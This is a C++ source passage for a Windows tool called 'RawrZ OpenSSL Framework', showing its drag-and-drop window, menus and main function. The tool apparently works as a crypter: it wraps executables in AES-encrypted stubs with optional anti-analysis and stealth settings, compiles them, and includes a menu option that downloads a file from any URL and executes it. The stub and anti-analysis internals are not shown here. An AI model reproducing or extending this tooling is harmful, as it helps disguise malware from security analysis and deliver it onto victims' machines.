    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    
    RegisterClassA(&wc);
    
    HWND hwnd = CreateWindowExA(
        0,
        className,
        "RawrZ OpenSSL - Drag & Drop .exe files here",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        600, 400,
        nullptr,
        nullptr,
        GetModuleHandle(nullptr),
        generator
    );
    
    if (hwnd) {
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }
    
    return hwnd;
}

// Interactive stub generation workflow
void RawrZUnlimitedStubGenerator::interactiveStubGeneration(const std::string& exePath) {
    std::cout << "\n=== INTERACTIVE STUB GENERATION ===" << std::endl;
    std::cout << "Target file: " << exePath << std::endl;
    std::cout << "File size: " << std::filesystem::file_size(exePath) << " bytes" << std::endl;
    
    // Show available stub types
    showStubTypes();
    
    int choice;
    std::cout << "\nSelect stub type (1-" << stubTemplates.size() << "): ";
    std::cin >> choice;
    
    if (choice < 1 || choice > (int)stubTemplates.size()) {
        std::cout << "Invalid choice, using default AES_256_CBC" << std::endl;
        choice = 1;
    }
    
    std::string selectedStubType = getStubType(choice - 1);
    std::cout << "Selected: " << selectedStubType << std::endl;
    
    // Anti-analysis options
    char antiAnalysisChoice;
    std::cout << "\nAdd anti-analysis features? (y/n): ";
    std::cin >> antiAnalysisChoice;
    bool addAntiAnalysis = (antiAnalysisChoice == 'y' || antiAnalysisChoice == 'Y');
    
    if (addAntiAnalysis) {
        std::cout << "Anti-analysis features enabled" << std::endl;
    }
    
    // Generate new keys for this stub
    generateNewKeys();
    
    // Generate and attach stub
    std::cout << "\nGenerating stub..." << std::endl;
    if (generateAndAttachStub(exePath, selectedStubType, addAntiAnalysis)) {
        std::cout << "[SUCCESS] Stub generated successfully!" << std::endl;
        
        // Optional compilation
        char compileChoice;
        std::cout << "\nCompile to executable? (y/n): ";
        std::cin >> compileChoice;
        
        if (compileChoice == 'y' || compileChoice == 'Y') {
            std::cout << "Compiling stub..." << std::endl;
            std::string stubFile = exePath + ".stub.cs";
            std::string command = "csc /target:exe /out:" + exePath + "_stub.exe " + stubFile;
            
            if (system(command.c_str()) == 0) {
                std::cout << "[SUCCESS] Stub compiled to: " << exePath << "_stub.exe" << std::endl;
            } else {
                std::cout << "[WARNING] Compilation failed. Install .NET SDK for C# compilation." << std::endl;
            }
        }
    } else {
        std::cout << "[ERROR] Failed to generate stub!" << std::endl;
    }
}

// Process dropped file
bool RawrZUnlimitedStubGenerator::processDroppedFile(const std::string& filePath) {
    try {
        if (!std::filesystem::exists(filePath)) {
            std::cout << "[ERROR] File does not exist: " << filePath << std::endl;
            return false;
        }
        
        if (!isValidExecutable(filePath)) {
            std::cout << "[ERROR] Invalid file type. Only executables are supported." << std::endl;
            return false;
        }
        
        std::cout << "[INFO] Processing dropped file: " << filePath << std::endl;
        
        // Start interactive workflow
        interactiveStubGeneration(filePath);
        
        return true;
        
    } catch (const std::exception& e) {
        std::cout << "[ERROR] Failed to process dropped file: " << e.what() << std::endl;
        return false;
    }
}

// Main menu system
void showMainMenu() {
    // Simple ASCII menu without problematic characters
    std::cout << "\n";
    std::cout << "==================================================" << std::endl;
    std::cout << "                RawrZ OpenSSL Menu                " << std::endl;
    std::cout << "==================================================" << std::endl;
    std::cout << "  1. Drag & Drop Mode (GUI Window)               " << std::endl;
    std::cout << "  2. Interactive Stub Generation                 " << std::endl;
    std::cout << "  3. Batch Stub Generation                       " << std::endl;
    std::cout << "  4. Stub Analysis & Comparison                  " << std::endl;
    std::cout << "  5. Test OpenSSL Functionality                  " << std::endl;
    std::cout << "  6. Configuration Settings                       " << std::endl;
    std::cout << "  7. Show Available Stub Types                   " << std::endl;
    std::cout << "  8. Help & Usage Information                    " << std::endl;
    std::cout << "  9. File Downloader & Executor                  " << std::endl;
    std::cout << "  0. Exit                                         " << std::endl;
    std::cout << "==================================================" << std::endl;
    std::cout << "Enter your choice: ";
}

// Handle menu selection
void handleMenuSelection(int choice, RawrZUnlimitedStubGenerator& generator) {
    switch (choice) {
        case 1: {
            std::cout << "\n=== DRAG & DROP MODE ===" << std::endl;
            std::cout << "Creating drag & drop window..." << std::endl;
            std::cout << "Drop executable files onto the window to process them." << std::endl;
            
            HWND hwnd = createDragDropWindow(&generator);
            if (hwnd) {
                std::cout << "Drag & drop window created successfully!" << std::endl;
                std::cout << "Press any key to close the window..." << std::endl;
                std::cin.ignore();
                std::cin.get();
                DestroyWindow(hwnd);
            } else {
                std::cout << "[ERROR] Failed to create drag & drop window!" << std::endl;
            }
            break;
        }
        
        case 2: {
            std::cout << "\n=== INTERACTIVE STUB GENERATION ===" << std::endl;
            std::string exePath;
            std::cout << "Enter path to executable: ";
            std::cin.ignore();
            std::getline(std::cin, exePath);
            
            if (!exePath.empty()) {
                generator.interactiveStubGeneration(exePath);
            }
            break;
        }
        
        case 3: {
            generator.batchGenerateStubs({}, "", false);
            break;
        }
        
        case 4: {
            std::cout << "\n=== STUB ANALYSIS & COMPARISON ===" << std::endl;
            std::string stub1Path, stub2Path;
            
            std::cout << "Enter path to first stub: ";
            std::cin.ignore();
            std::getline(std::cin, stub1Path);
            
            std::cout << "Enter path to second stub: ";
            std::getline(std::cin, stub2Path);
            
            if (!stub1Path.empty() && !stub2Path.empty()) {
                generator.compareStubs(stub1Path, stub2Path);
            }
            break;
        }
        
        case 5: {
            std::cout << "\n=== TESTING OPENSSL FUNCTIONALITY ===" << std::endl;
            
            // Generate cryptographically secure random string
            std::string secureRandom = generator.generateRandomString(32, true);
            std::cout << "Cryptographically Secure Random String: " << secureRandom << std::endl;
            
            // Test encryption
            std::string testData = "Hello, OpenSSL World!";
            std::vector<unsigned char> testBytes(testData.begin(), testData.end());
            auto encrypted = generator.encryptWithAES(testBytes);
            std::string encoded = generator.base64Encode(encrypted);
            std::cout << "Test encryption successful. Encoded length: " << encoded.length() << std::endl;
            
            // Test stub analysis
            std::string analysis = generator.analyzeStubRandomness(encoded);
            std::cout << "\nStub Randomness Analysis:\n" << analysis << std::endl;
            
            std::cout << "\nOpenSSL build is working correctly!" << std::endl;
            std::cout << "Configuration: useOpenSSL = " << (g_config.useOpenSSL ? "true" : "false") << std::endl;
            break;
        }
        
        case 6: {
            std::cout << "\n=== CONFIGURATION SETTINGS ===" << std::endl;
            std::cout << "Current Configuration:" << std::endl;
            std::cout << "  - Use OpenSSL: " << (g_config.useOpenSSL ? "Enabled" : "Disabled") << std::endl;
            std::cout << "  - Enhanced Encryption: " << (g_config.useEnhancedEncryption ? "Enabled" : "Disabled") << std::endl;
            std::cout << "  - Anti-Analysis: " << (g_config.useAntiAnalysis ? "Enabled" : "Disabled") << std::endl;
            std::cout << "  - Stealth Mode: " << (g_config.useStealth ? "Enabled" : "Disabled") << std::endl;
            std::cout << "  - Output Directory: " << g_config.defaultOutputDir << std::endl;
            std::cout << "  - Log File: " << g_config.logFile << std::endl;
            std::cout << "  - Encryption Rounds: " << g_config.encryptionRounds << std::endl;
            std::cout << "  - Verbose Logging: " << (g_config.verboseLogging ? "Enabled" : "Disabled") << std::endl;
            
            // Allow user to modify settings
            std::cout << "\nModify settings? (1=Yes, 0=No): ";
            int modify;
            std::cin >> modify;
            
            if (modify == 1) {
                std::cout << "Toggle OpenSSL usage? (1=Yes, 0=No): ";
                std::cin >> g_config.useOpenSSL;
                
                std::cout << "Toggle enhanced encryption? (1=Yes, 0=No): ";
                std::cin >> g_config.useEnhancedEncryption;
                
                std::cout << "Toggle anti-analysis? (1=Yes, 0=No): ";
                std::cin >> g_config.useAntiAnalysis;
                
                std::cout << "Configuration updated!" << std::endl;
            }
            break;
        }
        
        case 7: {
            std::cout << "\n=== AVAILABLE STUB TYPES ===" << std::endl;
            generator.showStubTypes();
            break;
        }
        
        case 8: {
            std::cout << "\n=== HELP & USAGE INFORMATION ===" << std::endl;
            std::cout << "Command Line Usage:" << std::endl;
            std::cout << "  RawrZ_OpenSSL.exe                    - Start menu mode" << std::endl;
            std::cout << "  RawrZ_OpenSSL.exe <exe_path>         - Process specific executable" << std::endl;
            std::cout << "  RawrZ_OpenSSL.exe --interactive      - Start interactive mode" << std::endl;
            std::cout << "  RawrZ_OpenSSL.exe --test             - Test OpenSSL functionality" << std::endl;
            std::cout << "  RawrZ_OpenSSL.exe --help             - Show this help" << std::endl;
            std::cout << "\nFeatures:" << std::endl;
            std::cout << "  • Real OpenSSL AES-256-CBC encryption" << std::endl;
            std::cout << "  • 15 different stub types" << std::endl;
            std::cout << "  • Anti-analysis features" << std::endl;
            std::cout << "  • Drag & drop support" << std::endl;
            std::cout << "  • Batch processing" << std::endl;
            std::cout << "  • Stub analysis & comparison" << std::endl;
            std::cout << "  • File downloader & executor" << std::endl;
            break;
        }
        
        case 9: {
            std::cout << "\n=== FILE DOWNLOADER & EXECUTOR ===" << std::endl;
            FileDownloader downloader;
            
            std::cout << "1. Download file from URL" << std::endl;
            std::cout << "2. Execute downloaded file" << std::endl;
            std::cout << "3. List downloaded files" << std::endl;
            std::cout << "4. Back to main menu" << std::endl;
            
            int downloadChoice;
            std::cout << "Enter choice (1-4): ";
            std::cin >> downloadChoice;
            
            switch (downloadChoice) {
                case 1: {
                    std::string url, filename;
                    std::cout << "Enter URL: ";
                    std::cin.ignore();
                    std::getline(std::cin, url);
                    std::cout << "Enter filename: ";
                    std::getline(std::cin, filename);
                    
                    if (!url.empty() && !filename.empty()) {
                        downloader.downloadFile(url, filename);
                    }
                    break;
                }
                case 2: {
                    std::string filename;
                    std::cout << "Enter filename to execute: ";
                    std::cin.ignore();
                    std::getline(std::cin, filename);
                    
                    if (!filename.empty()) {
                        downloader.executeFile(filename);
                    }
                    break;
                }
                case 3: {
                    downloader.listDownloadedFiles();
                    break;
                }
                case 4:
                    break;
                default:
                    std::cout << "[ERROR] Invalid choice!" << std::endl;
            }
            break;
        }
        
        case 0: {
            std::cout << "\nExiting RawrZ OpenSSL Framework..." << std::endl;
            exit(0);
            break;
        }
        
        default: {
            std::cout << "[ERROR] Invalid choice! Please select 0-9." << std::endl;
            break;
        }
    }
}

// Main function
int main(int argc, char* argv[]) {
    try {
        // Initialize OpenSSL
        initializeOpenSSL();
        std::cout << "OpenSSL initialized successfully!" << std::endl;
        
        std::cout << "╔══════════════════════════════════════════════════════════════╗" << std::endl;
        std::cout << "║                RawrZ OpenSSL Framework                      ║" << std::endl;
        std::cout << "║                    Version 2.0 OpenSSL                     ║" << std::endl;
        std::cout << "║                                                              ║" << std::endl;
        std::cout << "║  Features:                                                   ║" << std::endl;
        std::cout << "║  • OpenSSL AES-256-CBC Encryption                          ║" << std::endl;
        std::cout << "║  • Cryptographically Secure Random Generation              ║" << std::endl;
        std::cout << "║  • Real Base64 Encoding                                    ║" << std::endl;
        std::cout << "║  • Advanced Stub Generation                                ║" << std::endl;
        std::cout << "║  • Anti-Analysis Features                                  ║" << std::endl;
        std::cout << "║  • Enhanced Stub Analysis with Statistical Tests          ║" << std::endl;
        std::cout << "║  • Advanced Stub Comparison Algorithms                     ║" << std::endl;
        std::cout << "║  • Drag & Drop Support for Executables                    ║" << std::endl;
        std::cout << "║  • Interactive Stub Generation Workflow                  ║" << std::endl;
        std::cout << "╚══════════════════════════════════════════════════════════════╝" << std::endl;
        
        // Check command line arguments
        if (argc > 1) {
            std::string arg = argv[1];
            if (arg == "--help" || arg == "-h") {
                std::cout << "\nUsage:" << std::endl;
                std::cout << "  RawrZ_OpenSSL.exe                    - Start menu mode" << std::endl;
                std::cout << "  RawrZ_OpenSSL.exe <exe_path>         - Process specific executable" << std::endl;
                std::cout << "  RawrZ_OpenSSL.exe --interactive      - Start interactive mode" << std::endl;
                std::cout << "  RawrZ_OpenSSL.exe --test             - Test OpenSSL functionality" << std::endl;
                std::cout << "  RawrZ_OpenSSL.exe --help             - Show this help" << std::endl;
                return 0;
            } else if (arg == "--test") {
                // Test OpenSSL functionality
                RawrZUnlimitedStubGenerator generator;
                std::cout << "\nTesting OpenSSL functionality..." << std::endl;
                
                // Generate cryptographically secure random string
                std::string secureRandom = generator.generateRandomString(32, true);
                std::cout << "Cryptographically Secure Random String: " << secureRandom << std::endl;
                
                // Test encryption
                std::string testData = "Hello, OpenSSL World!";
                std::vector<unsigned char> testBytes(testData.begin(), testData.end());
                auto encrypted = generator.encryptWithAES(testBytes);
                std::string encoded = generator.base64Encode(encrypted);
                std::cout << "Test encryption successful. Encoded length: " << encoded.length() << std::endl;
                
                // Test stub analysis
                std::string analysis = generator.analyzeStubRandomness(encoded);
                std::cout << "\nStub Randomness Analysis:\n" << analysis << std::endl;
                
                std::cout << "\nOpenSSL build is working correctly!" << std::endl;
                std::cout << "Configuration: useOpenSSL = " << (g_config.useOpenSSL ? "true" : "false") << std::endl;
                
                cleanupOpenSSL();
                return 0;
            } else if (arg == "--interactive") {
                // Interactive mode
                RawrZUnlimitedStubGenerator generator;
                std::string exePath;
                
                std::cout << "\n=== INTERACTIVE STUB GENERATION MODE ===" << std::endl;
                std::cout << "Enter path to executable: ";
                std::getline(std::cin, exePath);
                
                if (!exePath.empty()) {
                    generator.interactiveStubGeneration(exePath);
                }
                
                cleanupOpenSSL();
                return 0;
            } else {
                // Process specific executable file
                std::string exePath = arg;
                if (std::filesystem::exists(exePath)) {
                    RawrZUnlimitedStubGenerator generator;
                    std::cout << "\nProcessing executable: " << exePath << std::endl;
                    generator.interactiveStubGeneration(exePath);
                } else {
                    std::cout << "[ERROR] File not found: " << exePath << std::endl;
                    std::cout << "Use --help for usage information." << std::endl;
                    return 1;
                }
                
                cleanupOpenSSL();
                return 0;
            }
        }
        
        // Default: Start drag & drop mode
        RawrZUnlimitedStubGenerator generator;
        showMainMenu();
        int choice;
        while (std::cin >> choice) {
            handleMenuSelection(choice, generator);
        }
        
        cleanupOpenSSL();
        return 0;
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        cleanupOpenSSL();
        return 1;
    }
}
